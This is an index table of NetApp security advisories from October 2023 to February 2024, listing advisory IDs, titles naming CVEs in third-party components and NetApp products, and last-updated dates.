| [**NTAP-20240202-0011**](https://security.netapp.com/advisory/ntap-20240202-0011/) | January 2024 GnuTLS Vulnerabilities in NetApp Products | 2024-06-03 |
| [**NTAP-20240201-0001**](https://security.netapp.com/advisory/ntap-20240201-0001/) | CVE-2023-31248 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240201-0004**](https://security.netapp.com/advisory/ntap-20240201-0004/) | CVE-2023-5363 MySQL Connector/ODBC Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240201-0006**](https://security.netapp.com/advisory/ntap-20240201-0006/) | CVE-2024-20965 MySQL Cluster Vulnerability in NetApp Products | 2024-05-23 |
| [**NTAP-20240201-0007**](https://security.netapp.com/advisory/ntap-20240201-0007/) | CVE-2024-20975 MySQL Server Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240201-0009**](https://security.netapp.com/advisory/ntap-20240201-0009/) | CVE-2024-20983 MySQL Server Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240201-0002**](https://security.netapp.com/advisory/ntap-20240201-0002/) | January 2024 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2025-01-06 |
| [**NTAP-20240201-0005**](https://security.netapp.com/advisory/ntap-20240201-0005/) | January 2024 MySQL Cluster Vulnerabilities in NetApp Products | 2024-05-23 |
| [**NTAP-20240201-0008**](https://security.netapp.com/advisory/ntap-20240201-0008/) | January 2024 MySQL Server 8.0.34 Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240201-0003**](https://security.netapp.com/advisory/ntap-20240201-0003/) | January 2024 MySQL Server 8.0.35 Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240126-0001**](https://security.netapp.com/advisory/ntap-20240126-0001/) | CVE-2024-21985 Privilege Escalation Vulnerability in ONTAP 9 | 2024-01-26 |
| [**NTAP-20240125-0005**](https://security.netapp.com/advisory/ntap-20240125-0005/) | CVE-2023-2861 QEMU Vulnerability in NetApp Products | 2024-01-25 |
| [**NTAP-20240125-0001**](https://security.netapp.com/advisory/ntap-20240125-0001/) | CVE-2023-33202 Bouncy Castle Vulnerability in NetApp Products | 2024-07-19 |
| [**NTAP-20240125-0007**](https://security.netapp.com/advisory/ntap-20240125-0007/) | CVE-2023-46218 curl Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240125-0002**](https://security.netapp.com/advisory/ntap-20240125-0002/) | CVE-2023-46672 Logstash Vulnerability in NetApp Products | 2024-01-25 |
| [**NTAP-20240125-0008**](https://security.netapp.com/advisory/ntap-20240125-0008/) | CVE-2023-4806 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240125-0006**](https://security.netapp.com/advisory/ntap-20240125-0006/) | CVE-2023-51767 OpenSSH Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240125-0004**](https://security.netapp.com/advisory/ntap-20240125-0004/) | December 2023 Infinispan Vulnerabilities in NetApp Products | 2024-01-25 |
| [**NTAP-20240125-0003**](https://security.netapp.com/advisory/ntap-20240125-0003/) | December 2023 X.Org X Server Vulnerabilities in NetApp Products | 2024-06-10 |
| [**NTAP-20240119-0013**](https://security.netapp.com/advisory/ntap-20240119-0013/) | CVE-2022-23633 Ruby on Rails Vulnerability in NetApp Products | 2024-01-19 |
| [**NTAP-20240119-0011**](https://security.netapp.com/advisory/ntap-20240119-0011/) | CVE-2023-2007 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240119-0010**](https://security.netapp.com/advisory/ntap-20240119-0010/) | CVE-2023-21255 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240119-0012**](https://security.netapp.com/advisory/ntap-20240119-0012/) | CVE-2023-21400 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240119-0007**](https://security.netapp.com/advisory/ntap-20240119-0007/) | CVE-2023-46219 curl Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240119-0006**](https://security.netapp.com/advisory/ntap-20240119-0006/) | CVE-2023-49288 Squid Vulnerability in NetApp Products | 2024-01-19 |
| [**NTAP-20240119-0005**](https://security.netapp.com/advisory/ntap-20240119-0005/) | CVE-2023-50269 Squid Vulnerability in NetApp Products | 2024-01-19 |
| [**NTAP-20240119-0008**](https://security.netapp.com/advisory/ntap-20240119-0008/) | CVE-2023-50495 GNU Ncurses Vulnerability in NetApp Products | 2024-06-03 |
| [**NTAP-20240119-0009**](https://security.netapp.com/advisory/ntap-20240119-0009/) | CVE-2023-5528 Kubernetes Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240119-0002**](https://security.netapp.com/advisory/ntap-20240119-0002/) | CVE-2023-6277 LibTIFF Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20240119-0001**](https://security.netapp.com/advisory/ntap-20240119-0001/) | December 2023 IBM DB2 Vulnerabilities in NetApp Products | 2024-01-19 |
| [**NTAP-20240119-0003**](https://security.netapp.com/advisory/ntap-20240119-0003/) | December 2023 PostgreSQL Vulnerabilities in NetApp Products | 2024-08-23 |
| [**NTAP-20240119-0004**](https://security.netapp.com/advisory/ntap-20240119-0004/) | December 2023 Squid Vulnerabilities in NetApp Products | 2024-10-22 |
| [**NTAP-20240112-0001**](https://security.netapp.com/advisory/ntap-20240112-0001/) | CVE-2023-26031 Apache Hadoop Vulnerability in NetApp Products | 2024-01-12 |
| [**NTAP-20240112-0002**](https://security.netapp.com/advisory/ntap-20240112-0002/) | CVE-2023-29258 IBM Db2 Vulnerability in NetApp Products | 2024-01-12 |
| [**NTAP-20240112-0004**](https://security.netapp.com/advisory/ntap-20240112-0004/) | CVE-2023-45178 IBM Db2 Vulnerability in NetApp Products | 2024-01-12 |
| [**NTAP-20240112-0005**](https://security.netapp.com/advisory/ntap-20240112-0005/) | CVE-2023-45287 Golang Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240112-0003**](https://security.netapp.com/advisory/ntap-20240112-0003/) | CVE-2023-46167 IBM Db2 Vulnerability in NetApp Products | 2024-01-12 |
| [**NTAP-20240112-0006**](https://security.netapp.com/advisory/ntap-20240112-0006/) | CVE-2023-6337 HashiCorp Vault Vulnerability in NetApp Products | 2024-01-12 |
| [**NTAP-20240112-0007**](https://security.netapp.com/advisory/ntap-20240112-0007/) | CVE-2023-6534 FreeBSD Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20240112-0008**](https://security.netapp.com/advisory/ntap-20240112-0008/) | CVE-2023-7104 SQLite Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20240111-0001**](https://security.netapp.com/advisory/ntap-20240111-0001/) | CVE-2024-21982 Information Disclosure Vulnerability in ONTAP 9 | 2024-01-11 |
| [**NTAP-20240105-0003**](https://security.netapp.com/advisory/ntap-20240105-0003/) | AMI AptioV SA-2023009 Vulnerabilities in NetApp Products | 2024-03-21 |
| [**NTAP-20240105-0002**](https://security.netapp.com/advisory/ntap-20240105-0002/) | CVE-2023-40238 InsydeH2O Vulnerability in NetApp Products | 2024-03-21 |
| [**NTAP-20240105-0001**](https://security.netapp.com/advisory/ntap-20240105-0001/) | CVE-2023-48706 Vim Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240105-0004**](https://security.netapp.com/advisory/ntap-20240105-0004/) | CVE-2023-48795 SSH Protocol Vulnerability in NetApp Products | 2024-11-14 |
| [**NTAP-20240105-0005**](https://security.netapp.com/advisory/ntap-20240105-0005/) | January 2024 OpenSSH Vulnerabilities in NetApp Products | 2024-11-22 |
| [**NTAP-20231227-0010**](https://security.netapp.com/advisory/ntap-20231227-0010/) | CVE-2018-8088 SLF4j Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20231227-0009**](https://security.netapp.com/advisory/ntap-20231227-0009/) | CVE-2019-10158 Infinispan Vulnerability in NetApp Products | 2023-12-27 |
| [**NTAP-20231227-0011**](https://security.netapp.com/advisory/ntap-20231227-0011/) | CVE-2019-3773 Spring Web Services Vulnerability in NetApp Products | 2023-12-27 |
| [**NTAP-20231227-0008**](https://security.netapp.com/advisory/ntap-20231227-0008/) | CVE-2023-48231 Vim Vulnerability in NetApp Products | 2024-02-22 |
| [**NTAP-20231227-0006**](https://security.netapp.com/advisory/ntap-20231227-0006/) | CVE-2023-48232 Vim Vulnerability in NetApp Products | 2024-05-27 |
| [**NTAP-20231227-0003**](https://security.netapp.com/advisory/ntap-20231227-0003/) | CVE-2023-48233 Vim Vulnerability in NetApp Products | 2024-04-11 |
| [**NTAP-20231227-0004**](https://security.netapp.com/advisory/ntap-20231227-0004/) | CVE-2023-48234 Vim Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20231227-0007**](https://security.netapp.com/advisory/ntap-20231227-0007/) | CVE-2023-48235 Vim Vulnerability in NetApp Products | 2024-05-27 |
| [**NTAP-20231227-0002**](https://security.netapp.com/advisory/ntap-20231227-0002/) | CVE-2023-48236 Vim Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20231227-0005**](https://security.netapp.com/advisory/ntap-20231227-0005/) | CVE-2023-48237 Vim Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20231227-0001**](https://security.netapp.com/advisory/ntap-20231227-0001/) | CVE-2023-5954 HashiCorp Vault Vulnerability in NetApp Products | 2023-12-27 |
| [**NTAP-20231222-0001**](https://security.netapp.com/advisory/ntap-20231222-0001/) | November 2023 AsyncSSH Vulnerabilities in NetApp Products | 2023-12-22 |
| [**NTAP-20231221-0003**](https://security.netapp.com/advisory/ntap-20231221-0003/) | CVE-2021-25736 Kubernetes Vulnerability in NetApp Products | 2024-01-01 |
| [**NTAP-20231221-0005**](https://security.netapp.com/advisory/ntap-20231221-0005/) | CVE-2022-3172 Kubernetes Vulnerability in NetApp Products | 2024-01-01 |
| [**NTAP-20231221-0006**](https://security.netapp.com/advisory/ntap-20231221-0006/) | CVE-2023-1194 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231221-0011**](https://security.netapp.com/advisory/ntap-20231221-0011/) | CVE-2023-27319 Information Disclosure Vulnerability in ONTAP Mediator | 2023-12-21 |
| [**NTAP-20231221-0007**](https://security.netapp.com/advisory/ntap-20231221-0007/) | CVE-2023-28376 Intel Ethernet Controller Vulnerability in NetApp Products | 2023-12-21 |
| [**NTAP-20231221-0010**](https://security.netapp.com/advisory/ntap-20231221-0010/) | CVE-2023-34055 Spring Boot Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20231221-0004**](https://security.netapp.com/advisory/ntap-20231221-0004/) | CVE-2023-3893 Kubernetes Vulnerability in NetApp Products | 2024-03-15 |
| [**NTAP-20231221-0002**](https://security.netapp.com/advisory/ntap-20231221-0002/) | CVE-2023-3955 Kubernetes Vulnerability in NetApp Products | 2024-03-15 |
| [**NTAP-20231221-0001**](https://security.netapp.com/advisory/ntap-20231221-0001/) | CVE-2023-43665 Django Vulnerability in NetApp Products | 2023-12-21 |
| [**NTAP-20231221-0009**](https://security.netapp.com/advisory/ntap-20231221-0009/) | CVE-2023-4809 FreeBSD Vulnerability in NetApp Products | 2023-12-21 |
| [**NTAP-20231221-0008**](https://security.netapp.com/advisory/ntap-20231221-0008/) | Intel SA-00924 BIOS Firmware Vulnerabilities in NetApp Products | 2023-12-21 |
| [**NTAP-20231215-0001**](https://security.netapp.com/advisory/ntap-20231215-0001/) | CVE-2023-27317 Information Disclosure Vulnerability in ONTAP 9 | 2023-12-15 |
| [**NTAP-20231214-0007**](https://security.netapp.com/advisory/ntap-20231214-0007/) | CVE-2023-34053 Spring Framework Vulnerability in NetApp Products | 2024-02-12 |
| [**NTAP-20231214-0002**](https://security.netapp.com/advisory/ntap-20231214-0002/) | CVE-2023-41164 Django Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231214-0008**](https://security.netapp.com/advisory/ntap-20231214-0008/) | CVE-2023-45283 Golang Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20231214-0009**](https://security.netapp.com/advisory/ntap-20231214-0009/) | CVE-2023-46589 Apache Tomcat Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20231214-0001**](https://security.netapp.com/advisory/ntap-20231214-0001/) | CVE-2023-46695 Django Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231214-0006**](https://security.netapp.com/advisory/ntap-20231214-0006/) | CVE-2023-46728 Squid Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231214-0005**](https://security.netapp.com/advisory/ntap-20231214-0005/) | CVE-2023-46848 Squid Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231214-0010**](https://security.netapp.com/advisory/ntap-20231214-0010/) | CVE-2023-50164 Apache Struts Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20231214-0004**](https://security.netapp.com/advisory/ntap-20231214-0004/) | CVE-2023-5941 FreeBSD Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231214-0003**](https://security.netapp.com/advisory/ntap-20231214-0003/) | CVE-2023-5978 FreeBSD Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231208-0012**](https://security.netapp.com/advisory/ntap-20231208-0012/) | CVE-2022-30122 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0011**](https://security.netapp.com/advisory/ntap-20231208-0011/) | CVE-2022-30123 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0010**](https://security.netapp.com/advisory/ntap-20231208-0010/) | CVE-2022-44570 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0013**](https://security.netapp.com/advisory/ntap-20231208-0013/) | CVE-2022-44571 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0014**](https://security.netapp.com/advisory/ntap-20231208-0014/) | CVE-2022-44572 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0015**](https://security.netapp.com/advisory/ntap-20231208-0015/) | CVE-2023-27530 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0016**](https://security.netapp.com/advisory/ntap-20231208-0016/) | CVE-2023-27539 Rack Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0008**](https://security.netapp.com/advisory/ntap-20231208-0008/) | CVE-2023-3138 libX11 Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0007**](https://security.netapp.com/advisory/ntap-20231208-0007/) | CVE-2023-34969 D-Bus Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20231208-0003**](https://security.netapp.com/advisory/ntap-20231208-0003/) | CVE-2023-4399 Grafana Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0006**](https://security.netapp.com/advisory/ntap-20231208-0006/) | CVE-2023-46246 Vim Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20231208-0001**](https://security.netapp.com/advisory/ntap-20231208-0001/) | CVE-2023-46724 Squid Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0005**](https://security.netapp.com/advisory/ntap-20231208-0005/) | CVE-2023-5088 QEMU Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20231208-0004**](https://security.netapp.com/advisory/ntap-20231208-0004/) | CVE-2023-5178 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231208-0002**](https://security.netapp.com/advisory/ntap-20231208-0002/) | October 2023 Grub Vulnerabilities in NetApp Products | 2023-12-20 |
| [**NTAP-20231208-0009**](https://security.netapp.com/advisory/ntap-20231208-0009/) | October 2023 Supermicro BMC Vulnerabilities in NetApp Products | 2023-12-20 |
| [**NTAP-20231130-0008**](https://security.netapp.com/advisory/ntap-20231130-0008/) | CVE-2022-4900 PHP Vulnerability in NetApp Products | 2023-11-30 |
| [**NTAP-20231130-0006**](https://security.netapp.com/advisory/ntap-20231130-0006/) | CVE-2023-31417 Elasticsearch Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20231130-0005**](https://security.netapp.com/advisory/ntap-20231130-0005/) | CVE-2023-31418 Elasticsearch Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20231130-0007**](https://security.netapp.com/advisory/ntap-20231130-0007/) | CVE-2023-3676 Kubernetes Vulnerability in NetApp Products | 2024-01-01 |
| [**NTAP-20231130-0001**](https://security.netapp.com/advisory/ntap-20231130-0001/) | CVE-2023-4163 Brocade Fabric OS Vulnerability | 2023-11-30 |
| [**NTAP-20231130-0009**](https://security.netapp.com/advisory/ntap-20231130-0009/) | CVE-2023-45853 Zlib Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20231130-0010**](https://security.netapp.com/advisory/ntap-20231130-0010/) | CVE-2023-5678 OpenSSL Vulnerability in NetApp Products | 2024-11-29 |
| [**NTAP-20231130-0003**](https://security.netapp.com/advisory/ntap-20231130-0003/) | CVE-2023-5824 Squid Vulnerability in NetApp Products | 2023-12-21 |
| [**NTAP-20231130-0002**](https://security.netapp.com/advisory/ntap-20231130-0002/) | November 2023 Squid Vulnerabilities in NetApp Products | 2023-11-30 |
| [**NTAP-20231130-0004**](https://security.netapp.com/advisory/ntap-20231130-0004/) | October 2023 X.Org X Server Vulnerabilities in NetApp Products | 2023-11-30 |
| [**NTAP-20231124-0006**](https://security.netapp.com/advisory/ntap-20231124-0006/) | CVE-2022-38087 Intel BIOS Firmware Vulnerability in NetApp Products | 2023-11-24 |
| [**NTAP-20231124-0001**](https://security.netapp.com/advisory/ntap-20231124-0001/) | CVE-2023-32252 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231124-0003**](https://security.netapp.com/advisory/ntap-20231124-0003/) | CVE-2023-3489 Brocade Fabric OS Vulnerability | 2023-11-24 |
| [**NTAP-20231124-0010**](https://security.netapp.com/advisory/ntap-20231124-0010/) | CVE-2023-4162 Brocade Fabric OS Vulnerability | 2023-11-24 |
| [**NTAP-20231124-0008**](https://security.netapp.com/advisory/ntap-20231124-0008/) | CVE-2023-46136 Werkzeug Vulnerability in NetApp Products | 2023-11-30 |
| [**NTAP-20231124-0004**](https://security.netapp.com/advisory/ntap-20231124-0004/) | CVE-2023-5368 FreeBSD Vulnerability in NetApp Products | 2023-11-24 |
| [**NTAP-20231124-0009**](https://security.netapp.com/advisory/ntap-20231124-0009/) | CVE-2023-5369 FreeBSD Vulnerability in NetApp Products | 2023-11-24 |
| [**NTAP-20231124-0005**](https://security.netapp.com/advisory/ntap-20231124-0005/) | CVE-2023-5370 FreeBSD Vulnerability in NetApp Products | 2023-11-24 |
| [**NTAP-20231124-0007**](https://security.netapp.com/advisory/ntap-20231124-0007/) | CVE-2023-5568 Samba Vulnerability in NetApp Products | 2023-11-30 |
| [**NTAP-20231124-0002**](https://security.netapp.com/advisory/ntap-20231124-0002/) | October 2023 Samba Vulnerabilities in NetApp Products | 2024-05-20 |
| [**NTAP-20231116-0002**](https://security.netapp.com/advisory/ntap-20231116-0002/) | CVE-2022-48554 File Vulnerability in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0015**](https://security.netapp.com/advisory/ntap-20231116-0015/) | CVE-2023-23583 Intel Processor Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20231116-0001**](https://security.netapp.com/advisory/ntap-20231116-0001/) | CVE-2023-2680 QEMU Vulnerability in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0010**](https://security.netapp.com/advisory/ntap-20231116-0010/) | CVE-2023-31419 Elasticsearch Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231116-0011**](https://security.netapp.com/advisory/ntap-20231116-0011/) | CVE-2023-36478 Eclipse Jetty Vulnerability in NetApp Products | 2024-06-21 |
| [**NTAP-20231116-0013**](https://security.netapp.com/advisory/ntap-20231116-0013/) | CVE-2023-38552 Node.js Vulnerability in NetApp Products | 2024-07-26 |
| [**NTAP-20231116-0008**](https://security.netapp.com/advisory/ntap-20231116-0008/) | CVE-2023-38719 IBM Db2 Vulnerability in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0003**](https://security.netapp.com/advisory/ntap-20231116-0003/) | CVE-2023-44466 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231116-0014**](https://security.netapp.com/advisory/ntap-20231116-0014/) | CVE-2023-45145 Redis Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20231116-0012**](https://security.netapp.com/advisory/ntap-20231116-0012/) | CVE-2023-4527 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231116-0004**](https://security.netapp.com/advisory/ntap-20231116-0004/) | CVE-2023-45862 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231116-0006**](https://security.netapp.com/advisory/ntap-20231116-0006/) | October 2023 IBM DB2 10.5.0.x, 11.1.4.x, and 11.5.x Vulnerabilities in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0005**](https://security.netapp.com/advisory/ntap-20231116-0005/) | October 2023 IBM DB2 11.1.4.x and 11.5.x Vulnerabilities in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0007**](https://security.netapp.com/advisory/ntap-20231116-0007/) | October 2023 IBM DB2 11.5.x Vulnerabilities in NetApp Products | 2023-11-16 |
| [**NTAP-20231116-0009**](https://security.netapp.com/advisory/ntap-20231116-0009/) | October 2023 Node.js Vulnerabilities in NetApp Products | 2023-12-14 |
| [**NTAP-20231110-0002**](https://security.netapp.com/advisory/ntap-20231110-0002/) | CVE-2023-32636 Gnome Glib Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231110-0008**](https://security.netapp.com/advisory/ntap-20231110-0008/) | CVE-2023-39325 Golang Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20231110-0005**](https://security.netapp.com/advisory/ntap-20231110-0005/) | CVE-2023-40745 LibTIFF Vulnerability in NetApp Products | 2023-11-17 |
| [**NTAP-20231110-0009**](https://security.netapp.com/advisory/ntap-20231110-0009/) | CVE-2023-40791 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231110-0004**](https://security.netapp.com/advisory/ntap-20231110-0004/) | CVE-2023-41900 Eclipse Jetty Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231110-0001**](https://security.netapp.com/advisory/ntap-20231110-0001/) | CVE-2023-45871 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231110-0010**](https://security.netapp.com/advisory/ntap-20231110-0010/) | CVE-2023-46604 Apache ActiveMQ Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20231110-0003**](https://security.netapp.com/advisory/ntap-20231110-0003/) | CVE-2023-4813 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231110-0007**](https://security.netapp.com/advisory/ntap-20231110-0007/) | October 2023 7-Zip Vulnerabilities in NetApp Products | 2024-05-20 |
| [**NTAP-20231110-0006**](https://security.netapp.com/advisory/ntap-20231110-0006/) | October 2023 Gradle Vulnerabilities in NetApp Products | 2023-11-10 |
| [**NTAP-20231103-0002**](https://security.netapp.com/advisory/ntap-20231103-0002/) | CVE-2023-25584 GNU Binutils Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20231103-0001**](https://security.netapp.com/advisory/ntap-20231103-0001/) | CVE-2023-29499 Gnome Glib Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231103-0004**](https://security.netapp.com/advisory/ntap-20231103-0004/) | CVE-2023-32005 Node.js Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231103-0005**](https://security.netapp.com/advisory/ntap-20231103-0005/) | CVE-2023-42467 QEMU Vulnerability in NetApp Products | 2023-11-03 |
| [**NTAP-20231103-0008**](https://security.netapp.com/advisory/ntap-20231103-0008/) | CVE-2023-4822 Grafana Vulnerability in NetApp Products | 2023-11-03 |
| [**NTAP-20231103-0007**](https://security.netapp.com/advisory/ntap-20231103-0007/) | October 2023 Apache Tomcat Vulnerabilities in NetApp Products | 2023-12-20 |
| [**NTAP-20231103-0006**](https://security.netapp.com/advisory/ntap-20231103-0006/) | October 2023 libX11 Vulnerabilities in NetApp Products | 2023-11-17 |
| [**NTAP-20231103-0003**](https://security.netapp.com/advisory/ntap-20231103-0003/) | September 2023 GNU Binutils 2.40 Vulnerabilities in NetApp Products | 2024-11-05 |
| [**NTAP-20231027-0002**](https://security.netapp.com/advisory/ntap-20231027-0002/) | August 2023 Linux Kernel 6.5-rc5 Vulnerabilities in NetApp Products | 2024-10-22 |
| [**NTAP-20231027-0003**](https://security.netapp.com/advisory/ntap-20231027-0003/) | CVE-2014-3577 Apache HttpComponents HttpClient Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231027-0007**](https://security.netapp.com/advisory/ntap-20231027-0007/) | CVE-2023-22102 MySQL Connector/J Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20231027-0004**](https://security.netapp.com/advisory/ntap-20231027-0004/) | CVE-2023-3223 Undertow Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20231027-0005**](https://security.netapp.com/advisory/ntap-20231027-0005/) | CVE-2023-32611 Gnome Glib Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20231027-0008**](https://security.netapp.com/advisory/ntap-20231027-0008/) | CVE-2023-3817 MySQL Connector/ODBC Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20231027-0001**](https://security.netapp.com/advisory/ntap-20231027-0001/) | CVE-2023-4004 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231027-0010**](https://security.netapp.com/advisory/ntap-20231027-0010/) | CVE-2023-5363 OpenSSL Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20231027-0011**](https://security.netapp.com/advisory/ntap-20231027-0011/) | October 2023 Apache HTTP Server Vulnerabilities in NetApp Products | 2024-04-11 |
| [**NTAP-20231027-0006**](https://security.netapp.com/advisory/ntap-20231027-0006/) | October 2023 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20231027-0009**](https://security.netapp.com/advisory/ntap-20231027-0009/) | October 2023 MySQL Server Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20231020-0002**](https://security.netapp.com/advisory/ntap-20231020-0002/) | CVE-2023-1108 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20231020-0010**](https://security.netapp.com/advisory/ntap-20231020-0010/) | CVE-2023-1260 Kubernetes Vulnerability in NetApp Products | 2023-10-20 |
| [**NTAP-20231020-0001**](https://security.netapp.com/advisory/ntap-20231020-0001/) | CVE-2023-39323 Golang Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20231020-0007**](https://security.netapp.com/advisory/ntap-20231020-0007/) | CVE-2023-40283 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231020-0005**](https://security.netapp.com/advisory/ntap-20231020-0005/) | CVE-2023-4132 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231020-0006**](https://security.netapp.com/advisory/ntap-20231020-0006/) | CVE-2023-4147 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231020-0003**](https://security.netapp.com/advisory/ntap-20231020-0003/) | CVE-2023-42503 Apache Commons Compress Vulnerability in NetApp Products | 2023-11-30 |
| [**NTAP-20231020-0004**](https://security.netapp.com/advisory/ntap-20231020-0004/) | September 2023 Golang 1.21.0 Vulnerabilities in NetApp Products | 2023-11-15 |
| [**NTAP-20231020-0009**](https://security.netapp.com/advisory/ntap-20231020-0009/) | September 2023 Golang Vulnerabilities in NetApp Products | 2023-11-15 |
| [**NTAP-20231020-0008**](https://security.netapp.com/advisory/ntap-20231020-0008/) | September 2023 QEMU Vulnerabilities in NetApp Products | 2023-10-20 |
| [**NTAP-20231016-0001**](https://security.netapp.com/advisory/ntap-20231016-0001/) | CVE-2023-44487 HTTP/2 Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20231013-0002**](https://security.netapp.com/advisory/ntap-20231013-0002/) | CVE-2023-20900 VMware Tools Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20231013-0003**](https://security.netapp.com/advisory/ntap-20231013-0003/) | CVE-2023-3341 ISC BIND Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20231013-0005**](https://security.netapp.com/advisory/ntap-20231013-0005/) | CVE-2023-38039 curl Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231013-0001**](https://security.netapp.com/advisory/ntap-20231013-0001/) | CVE-2023-41835 Apache Struts Vulnerability in NetApp Products | 2024-04-05 |
| [**NTAP-20231013-0004**](https://security.netapp.com/advisory/ntap-20231013-0004/) | CVE-2023-4236 ISC BIND Vulnerability in NetApp Products | 2023-11-07 |
| [**NTAP-20231013-0006**](https://security.netapp.com/advisory/ntap-20231013-0006/) | CVE-2023-4911 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20231012-0001**](https://security.netapp.com/advisory/ntap-20231012-0001/) | CVE-2023-27316 Privilege Escalation Vulnerability in SnapCenter | 2023-10-12 |
| [**NTAP-20231011-0001**](https://security.netapp.com/advisory/ntap-20231011-0001/) | October 2023 curl Vulnerabilities in NetApp Products | 2024-11-05 |
| [**NTAP-20231009-0001**](https://security.netapp.com/advisory/ntap-20231009-0001/) | CVE-2023-27314 Denial of Service Vulnerability in ONTAP 9 | 2023-10-09 |
| [**NTAP-20231009-0002**](https://security.netapp.com/advisory/ntap-20231009-0002/) | CVE-2023-27315 Information Disclosure Vulnerability in SnapGathers | 2023-10-09 |
